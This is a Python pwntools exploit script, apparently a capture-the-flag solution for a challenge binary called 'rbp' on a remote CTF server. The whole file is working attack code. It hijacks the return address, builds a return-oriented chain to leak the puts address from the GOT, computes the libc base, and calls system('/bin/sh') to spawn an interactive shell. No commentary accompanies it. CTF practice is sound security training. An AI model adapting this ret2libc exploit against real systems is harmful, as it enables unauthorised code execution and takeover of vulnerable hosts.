from pwn import*

#p = process('./rbp')
lib=ELF('libc.so.6')
#lib=ELF('libc6_2.31-0ubuntu9_amd64.so')
p=remote('pwn-2021.duc.tf',31910)
#raw_input('DEBUG')
main = 0x4011d5
ret = 0x40101a
pop_rdi = 0x4012b3
got_puts = 0x404018
plt_puts = 0x401030
payload=p64(main)
payload+=p64(ret)
payload+=p64(main)
p.recvuntil('Hi there! What is your name? ')
p.send(payload)
p.recvuntil('That is an interesting name.')
p.recvuntil('Do you have a favourite number? ')
p.sendline(str(-32))
payload=p64(pop_rdi)
payload+=p64(got_puts)
payload+=p64(plt_puts)
p.sendline(payload)
p.sendline(str(-40))
p.recvuntil('Do you have a favourite number? ')
puts=u64(p.recv(6)+"\x00\x00")
base=puts-lib.symbols['puts']
system=base+lib.symbols['system']
binsh=base+lib.search('/bin/sh').next()
log.info('puts: '+hex(puts))
log.info('base: '+hex(base))

payload=p64(pop_rdi)
payload+=p64(binsh)
payload+=p64(system)
p.recvuntil('Hi there! What is your name? ')
p.send(payload)
p.sendline(str(-40))


p.interactive()
